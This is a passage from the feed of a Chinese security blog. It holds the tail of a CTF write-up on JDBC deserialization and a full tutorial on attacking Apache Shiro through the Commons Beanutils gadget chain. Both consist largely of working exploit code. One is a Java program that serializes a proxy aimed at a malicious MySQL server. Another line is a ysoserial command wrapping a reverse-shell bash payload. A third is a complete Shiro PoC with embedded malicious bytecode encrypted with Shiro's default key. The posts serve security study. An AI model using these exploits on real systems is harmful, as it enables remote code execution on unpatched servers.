class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.password != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.connection == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.connect();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那其实思路挺简单的，利用动态代理调用<code>invoke</code>，然后通过<code>connect()</code>方法连接我们vps上的恶意数据库实现RCE，写exp了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdufs.challenge.web.invocation.InfoInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.DatabaseInfo;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldname, Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">            oos.writeObject(o);</span><br><span class="line">            <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        DatabaseInfo databaseInfo = <span class="keyword">new</span> DatabaseInfo();</span><br><span class="line">        setFieldValue(databaseInfo, <span class="string">&quot;host&quot;</span>, <span class="string">&quot;xx.xx.xx.xx&quot;</span>);</span><br><span class="line">        setFieldValue(databaseInfo, <span class="string">&quot;port&quot;</span>, <span class="string">&quot;3306&quot;</span>);</span><br><span class="line">        setFieldValue(databaseInfo, <span class="string">&quot;username&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(databaseInfo, <span class="string">&quot;password&quot;</span>, <span class="string">&quot;clyyyyy&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;gdufs.challenge.web.invocation.InfoInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Info.class);</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InfoInvocationHandler handler = (InfoInvocationHandler) construct.newInstance(databaseInfo);</span><br><span class="line">        Info proxinfo = (Info) Proxy.newProxyInstance(Info.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Info.class&#125;, handler);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = serialize(proxinfo);</span><br><span class="line">        <span class="keyword">byte</span>[] payload = Base64.getEncoder().encode(bytes);</span><br><span class="line">        System.out.print(<span class="keyword">new</span> String(payload));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前两个方法分别是反射给属性赋值的方法以及序列化的方法，然后在主函数中创建<code>DatabaseInfo</code>对象，用反射赋值，获取代理类对象，最后将序列化后的结果<code>base64</code>加密之后输出出来，很清晰的流程</p><p>然后我们在vps中生成一个反弹shell的<code>payload</code>，还是写入到<code>payload</code>文件中，就和我们本地测试的一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar yso*.jar CommonsCollections5 &quot;bash -c &#123;echo,反弹shell的语句base64后&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; payload</span><br></pre></td></tr></table></figure><p>然后运行上面那个py文件，运行<code>Mysql</code>恶意服务器，将<code>payload</code>打过去，别忘了监听端口：</p><p><img src="https://s2.loli.net/2022/03/19/GdXipBVzw9CQLPM.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/19/dUfYQGMkc8XaTjP.png" alt="image.png"></p><p>shell成功弹回来，拿下。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;jdbc反序列化&quot;&gt;&lt;a href=&quot;#jdbc反序列化&quot; class=&quot;headerlink&quot; title=&quot;jdbc反序列化&quot;&gt;&lt;/a&gt;jdbc反序列化&lt;/h1&gt;&lt;p&gt;这几天有点儿痛苦，看完了p神的&lt;code&gt;Java&lt;/code&gt;安全漫谈之后有点儿迷茫，&lt;code&gt;jndi&lt;/code&gt;看了看，&lt;code&gt;fastjson&lt;/code&gt;看了看，&lt;code&gt;jdbc&lt;/code&gt;也看了看，但感觉都看的不太细，很多东西也没搞明白，写文章感觉有点儿难受，所以说一周多都没更了，接下来就慢慢学着慢慢总结着吧，先来看看&lt;code&gt;jdbc&lt;/code&gt;反序列化&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之利用CB链攻击shiro</title>
    <link href="https://arsenetang.github.io/2022/03/10/Java%E7%AF%87%E4%B9%8B%E5%88%A9%E7%94%A8CB%E9%93%BE%E6%94%BB%E5%87%BBshiro/"/>
    <id>https://arsenetang.github.io/2022/03/10/Java%E7%AF%87%E4%B9%8B%E5%88%A9%E7%94%A8CB%E9%93%BE%E6%94%BB%E5%87%BBshiro/</id>
    <published>2022-03-09T16:00:00.000Z</published>
    <updated>2023-03-22T09:25:24.313Z</updated>
    
    <content type="html"><![CDATA[<h1 id="利用CB链攻击shiro"><a href="#利用CB链攻击shiro" class="headerlink" title="利用CB链攻击shiro"></a>利用CB链攻击shiro</h1><p>上一篇文章我们讲到了CB链，通过CB链弹出了计算器，那我们自然就会想到能不能利用CB链经过加密之后去攻击<code>shiro</code>呢？肯定是可以的，而且还挺简单的，和上篇文章基本类似，就是说有几个注意事项</p><span id="more"></span><p>既然说这篇文章我们要用CB链去打<code>shiro</code>，那肯定就用不到CC的依赖了，因为实际情况下很可能目标并没有安装<code>commons-collections</code>依赖，所以说我们也需要先去掉cc的依赖，就用上次p神写的<code>shiro_demo</code>就行了，在<code>pom.xml</code>里面删除cc有关的依赖，然后用<code>maven</code>重新加载项目，然后我们再看外部库里面就没有cc的依赖了</p><p><img src="https://s2.loli.net/2022/03/10/ufFga42BUMALQKb.png" alt="image.png"></p><p>但是如果我们仔细点儿观察<code>pom.xml</code>，会发现我们并没有导入CB的依赖，但是外部库里面却有CB，这是为什么呢？因为<code>Shiro</code>是依赖于<code>commons-beanutils</code>的，所以说只要有<code>shiro</code>就一定有CB，用CB利用链肯定会更加方便</p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>我们就先按照上一篇构造的CB链再加上加密过程先生成payload来试试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cb_shiro</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        BeanComparator comparator = <span class="keyword">new</span> BeanComparator();</span><br><span class="line">        Queue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;obj, obj&#125;);</span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] payload= barr.toByteArray();</span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span> [] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        ByteSource finalpayload = aes.encrypt(payload,key);</span><br><span class="line">        System.out.println(finalpayload.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="The-first-报错"><a href="#The-first-报错" class="headerlink" title="The first 报错"></a>The first 报错</h2><p>我们用这段POC生成<code>payload</code>去攻击<code>shiro</code>，会发现并没有弹出计算器，而且回去看<code>Tomcat</code>还有报错，信息如下：</p><p><img src="https://s1.ax1x.com/2023/03/22/ppdQrBn.png" alt="img.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc</span><br><span class="line">serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962</span><br></pre></td></tr></table></figure><p>意思就是给你说两个<code>serialVersionUID</code>不一样，那<code>serialVersionUID</code>是什么呢？</p><p>其实出现这个原因，就是因为库的版本不同，因为如果两个不同的版本使用了同一个类，由于版本不同，可能有一些方法和属性会发生一些变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 serialVersionUID 值，写入数据流中；反序列化时，如果发现对方 的环境中这个类计算出的<code>serialVersionUID</code> 不同，则反序列化就会异常退出，避免后续的未知隐患</p><p>而我们本地用的<code>commons-beanutils</code>是1.9.2版本，而<code>Shiro</code>中自带的<code>commons-beanutils</code>是1.8.3版本，版本不同自然就要出问题</p><p>所以说解决方法也很简单，把两个版本调成一样的就行，我们肯定不能去动<code>shiro</code>中的版本，那就把本地的版本调成1.8.3的版本就行了，调完之后记得用<code>maven</code>重新加载哈，看看外部库里版本对了就行</p><h2 id="The-second-报错"><a href="#The-second-报错" class="headerlink" title="The second 报错"></a>The second 报错</h2><p>这时候我们生成<code>payload</code>去打，发现还是不行，还是有报错，报错如下：</p><p><img src="https://s2.loli.net/2022/03/10/iGJPS1F8RhBCYwE.png" alt="image.png"></p><p>这个报错意思就是说没有找到<code>org.apache.commons.collections.comparators.ComparableComparator</code>类，从包名就可以看出这个类来自<code>commons-collections</code>；<code>commons-beanutils</code>本来应该是依赖于<code>commons-collections</code>的，照理说这个类应该能用；但问题就是，在<code>Shiro</code>中，它的<code>commons-beanutils</code>虽然包含了一部分<code>commons-collections</code>的类，但却不全。这也导致，正常使用<code>Shiro</code>的时候不需要依赖于<code>commons-collections</code>，但反序列化利用的时候需要依赖于<code>commons-collections</code>，也就是说我们用到了它没有的类，就离谱</p><p>那怎么办呢，我们就得想办法绕开这个类了，先看看它在哪里用到了<code>ComparableComparator</code>类</p><p><img src="https://s2.loli.net/2022/03/10/bmSKPtrIZjGeEMN.png" alt="image.png"></p><p>找到了，在这儿，也就是构造<code>BeanComparator</code>对象的时候，有些同学可能会有疑问，我们不是无参构造的<code>BeanComparator</code>对象吗，为啥会进这个呢？因为无参构造方法里面写的<code>this((String)null)</code>，那么相当于就会调用下面那个带参构造方法只不过<code>property</code>为空，调试一下就知道了，当没有显式传入<code>Comparator</code>的情况下，则默认使用<code>ComparableComparator</code></p><p>没有这个<code>ComparableComparator</code>我们就来找个别的类代替它，这个类条件如下：</p><ol><li>实现<code>java.util.Comparator</code>接口 </li><li>实现<code>java.io.Serializable</code>接口</li><li>Java、shiro或<code>commons-beanutils</code>自带，且兼容性强</li></ol><p>我们找到了一个类，它就是<code>CaseInsensitiveComparator</code>，这个<code>CaseInsensitiveComparator</code>类是<code>java.lang.String</code>类下的一个内部私有类，其实现了<code>Comparator</code>和<code>Serializable</code>，且位于Java的核心代码中，兼容性强，符合所有条件</p><p>我们通过<code>String.CASE_INSENSITIVE_ORDER</code>，即可拿到上下文中的<code>CaseInsensitiveComparator</code>对象，用它来代替<code>ComparableComparator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="keyword">null</span>,String.CASE_INSENSITIVE_ORDER);</span><br></pre></td></tr></table></figure><h2 id="The-third-报错"><a href="#The-third-报错" class="headerlink" title="The third 报错"></a>The third 报错</h2><p>这个报错就更离谱了，我直接连payload都生成不了哈哈哈，不过这个问题好解决：</p><p><img src="https://s2.loli.net/2022/03/10/fxQSwNb2EyDsRmn.png" alt="image.png"></p><p>应该是类型的问题，我们后面添加的是两个整形对象，不能转换成字符串类型，那我们把<code>1</code>改成<code>&quot;1&quot;</code>就解决了</p><h2 id="FINAL"><a href="#FINAL" class="headerlink" title="FINAL"></a>FINAL</h2><p>所以说最终的POC为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cb_shiro</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="keyword">null</span>,String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        Queue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;obj, obj&#125;);</span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] payload= barr.toByteArray();</span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span> [] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        ByteSource finalpayload = aes.encrypt(payload,key);</span><br><span class="line">        System.out.println(finalpayload.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/10/Pna89VWYfNBQoGL.png" alt="image.png"></p><p>成功咯</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;利用CB链攻击shiro&quot;&gt;&lt;a href=&quot;#利用CB链攻击shiro&quot; class=&quot;headerlink&quot; title=&quot;利用CB链攻击shiro&quot;&gt;&lt;/a&gt;利用CB链攻击shiro&lt;/h1&gt;&lt;p&gt;上一篇文章我们讲到了CB链，通过CB链弹出了计算器，那我们自然就会想到能不能利用CB链经过加密之后去攻击&lt;code&gt;shiro&lt;/code&gt;呢？肯定是可以的，而且还挺简单的，和上篇文章基本类似，就是说有几个注意事项&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之Commons Beanutils</title>
    <link href="https://arsenetang.github.io/2022/03/09/Java%E7%AF%87%E4%B9%8BCommons%20Beanutils/"/>
    <id>https://arsenetang.github.io/2022/03/09/Java%E7%AF%87%E4%B9%8BCommons%20Beanutils/</id>
    <published>2022-03-08T16:00:00.000Z</published>
    <updated>2022-03-09T10:48:33.488Z</updated>
    
